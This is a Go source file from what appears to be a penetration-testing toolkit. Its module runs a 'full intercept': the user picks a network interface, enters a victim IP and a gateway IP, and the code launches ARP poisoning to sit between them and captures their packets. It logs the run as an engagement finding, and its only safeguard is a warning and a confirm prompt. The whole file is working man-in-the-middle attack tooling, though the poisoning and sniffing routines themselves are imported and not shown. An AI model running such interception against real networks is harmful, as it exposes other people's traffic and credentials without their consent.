package netintercept

import (
	"fmt"
	"net"
	"strings"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/mitm"
	"github.com/bryanparreira/davoid/internal/modules/sniff"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

func Run() error {
	ui.Header("Network Intercept Suite — ARP Poison + Packet Capture")

	mode := ui.Select("Attack Mode", []string{
		"Full Intercept   (ARP poison + live packet capture — combined)",
		"ARP Poison Only  (MITM without sniffing)",
		"Packet Capture   (sniff existing traffic, no ARP poison)",
	})

	switch mode {
	case 0:
		return runFullIntercept()
	case 1:
		return mitm.Run()
	case 2:
		return sniff.Run()
	}
	return nil
}

func runFullIntercept() error {
	ifaces, _ := net.Interfaces()
	var ifaceNames []string
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			ifaceNames = append(ifaceNames, fmt.Sprintf("%-12s %s", iface.Name, iface.HardwareAddr))
		}
	}
	if len(ifaceNames) == 0 {
		ui.Fail("No network interfaces found.")
		return nil
	}

	idx := ui.Select("Network Interface", ifaceNames)
	if idx < 0 {
		return nil
	}
	iface := strings.Fields(ifaceNames[idx])[0]

	target := ui.Prompt("Target IP (victim)")
	gateway := ui.Prompt("Gateway IP (router)")
	if target == "" || gateway == "" {
		ui.Fail("Target and gateway required.")
		return nil
	}

	filter := ui.PromptDefault("BPF Filter", "tcp or udp")

	fmt.Println()
	ui.Warn("This will ARP poison the target and capture traffic. Authorized use only.")
	if !ui.Confirm("Launch full intercept?") {
		return nil
	}

	stopPoison, err := mitm.RunPoison(iface, target, gateway)
	if err != nil {
		ui.Fail(fmt.Sprintf("ARP poison failed: %v", err))
		return nil
	}
	defer stopPoison()

	ui.Success(fmt.Sprintf("ARP poisoning active: %s ↔ %s on %s", target, gateway, iface))

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "net_intercept", target,
			fmt.Sprintf("Full network intercept: %s ↔ %s", target, gateway),
			fmt.Sprintf("Interface: %s | Filter: %s", iface, filter),
			"CRITICAL", "")
	}

	ui.Info("Starting packet capture — Ctrl+C to stop both ARP poison and capture.")
	fmt.Println()

	if err := sniff.RunCapture(iface, filter, false); err != nil {
		return err
	}

	fmt.Println()
	ui.Success("Intercept stopped. ARP tables restored.")
	ui.PressEnter()
	return nil
}
